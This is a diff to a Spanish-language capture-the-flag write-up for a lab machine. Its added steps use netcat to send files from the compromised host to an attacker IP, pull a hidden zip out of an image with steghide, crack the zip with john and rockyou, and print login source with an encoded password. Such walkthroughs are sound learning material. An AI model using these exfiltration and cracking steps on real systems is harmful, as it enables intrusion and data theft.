@@ -295,8 +295,6 @@ Enunciado :
                   </body></html>
              
           - Redireccionamos el puerto 9001 que esta corriento un servicio http local para poder visualizar la web desde nuestro navegador(Remote Port Forwarding)
-      
-            Subimos socat a la maquina victima
 
             [+]Socat--> https://github.com/andrew-d/static-binaries/tree/master/binaries/linux
 
@@ -320,17 +318,100 @@ Enunciado :
 
             ![image](https://github.com/Esevka/CTF/assets/139042999/355e908d-1016-4b2a-b637-672b59f6ee5e)
 
-  
-    3) hacker.php --> Encontramos estos dos mensajes que no sabemos muy bien a que se refieren.
+                  Tras testear el formulario de login, la unica conclusion es que si las credenciales son validas nos cargar el fichero hacker.php
 
+    2) hacker.php, el nombre de una de las imagenes llama la atencion
+   
+            background-image: url('images/002d7e638fb463fb7a266f5ffc7ac47d.gif');
+
+            <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
             style="background-color:red;">You have reached this far. </h2>
             style="background-color:black;">Look in the dark! You will find your answer</h1>
 
-    4) Directorio images --> Encontramos dos imagenes las cuales una de ellas su nombre es un hash(md5) un poco raro
+    4) Directorio /images
 
-           -rw-r--r-- 1 root root 2083694 Oct  3  2020 002d7e638fb463fb7a266f5ffc7ac47d.gif
-           -rw-r--r-- 1 root root   68841 Oct  3  2020 hacker-with-laptop_23-2147985341.jpg
+       - Encontramos dos imagenes, el nombre de una de ellas parece un hash(md5)
 
+              www-data@ubuntu:/var/www/files/images$ ls -la
+              total 2112
+              drwxr-xr-x 2 root root    4096 Oct  3  2020 .
+              drwxr-xr-x 3 root root    4096 Oct  3  2020 ..
+              -rw-r--r-- 1 root root 2083694 Oct  3  2020 002d7e638fb463fb7a266f5ffc7ac47d.gif --> no obtenemos nada del hash
+              -rw-r--r-- 1 root root   68841 Oct  3  2020 hacker-with-laptop_23-2147985341.jpg
+
+        - Analizamos ambas imagenes por si ocultan alguna informacion.
+      
+            - Con netcat nos descargamos las imagenes a nuestra maquina de atacante para analizarlas
+         
+                  ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
+                  └─# nc -lnvp 1988 > 002d7e638fb463fb7a266f5ffc7ac47d.gif
+                  listening on [any] 1988 ...
+                  connect to [10.9.92.151] from (UNKNOWN) [10.10.134.121] 49766
+                  
+                  www-data@ubuntu:/var/www/files/images$ nc -nv 10.9.92.151 1988 < 002d7e638fb463fb7a266f5ffc7ac47d.gif 
+                  Connection to 10.9.92.151 1988 port [tcp/*] succeeded!
+
+                  ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
+                  └─# nc -lnvp 1988 > hacker-with-laptop_23-2147985341.jpg
+                  listening on [any] 1988 ...
+                  connect to [10.9.92.151] from (UNKNOWN) [10.10.134.121] 49770
+                  
+                  www-data@ubuntu:/var/www/files/images$ nc -nv 10.9.92.151 1988 < hacker-with-laptop_23-2147985341.jpg 
+                  Connection to 10.9.92.151 1988 port [tcp/*] succeeded!
+
+            - Analizamos ficheros y conseguimos extraer backup.zip de la imagen ---> hacker-with-laptop_23-2147985341.jpg
+         
+                  ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
+                  └─# steghide extract -sf hacker-with-laptop_23-2147985341.jpg 
+                  Enter passphrase: 
+                  wrote extracted data to "backup.zip".
+
+               Probamos todas las passwords encontradas por el momento y ninguna funciono.
+
+            - Crakeamos backup.zip a ver si podemos obtener su clave
+         
+                  ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
+                  └─# zip2john backup.zip > hash_zip                                    
+                  ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3 ts=2297 cs=2297 type=8
+                                                                                                                                                                                 
+                  ┌──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
+                  └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash_zip     
+                  Using default input encoding: UTF-8
+                  Loaded 1 password hash (PKZIP [32/64])
+                  Will run 3 OpenMP threads
+                  Press 'q' or Ctrl-C to abort, almost any other key for status
+                  pass1word        (backup.zip/source_code.php)     
+                  1g 0:00:00:00 DONE (2023-12-09 10:51) 33.33g/s 409600p/s 409600c/s 409600C/s horoscope..hawkeye
+                  Use the "--show" option to display all of the cracked passwords reliably
+                  Session completed.
+              
+            -  Descomprimimos backup.zip y obtenemos el fichero --> source_code.php
+         
+                    ──(root㉿kali)-[/home/…/ctf/try_ctf/chill_hack/contenido]
+                    └─# cat source_code.php 
+                    <html>
+                     [...]
+                    <?php
+                            if(isset($_POST['submit']))
+                            {
+                                    $email = $_POST["email"];
+                                    $password = $_POST["password"];
+                                    if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
+                                    { 
+                                            $random = rand(1000,9999);?><br><br><br>
+                                            <form method="POST">
+                                                    Enter the OTP: <input type="number" name="otp">
+                                                    <input type="submit" name="submitOtp" value="Submit">
+                                            </form>
+                                    <?php   mail($email,"OTP for authentication",$random);
+                                            if(isset($_POST["submitOtp"]))
+                                                    {
+                                                            $otp = $_POST["otp"];
+                                                            if($otp == $random)
+                                                            {
+                                                                    echo "Welcome Anurodh!";
+                                                                    header("Location: authenticated.php");
+                            [...]
 
 
     
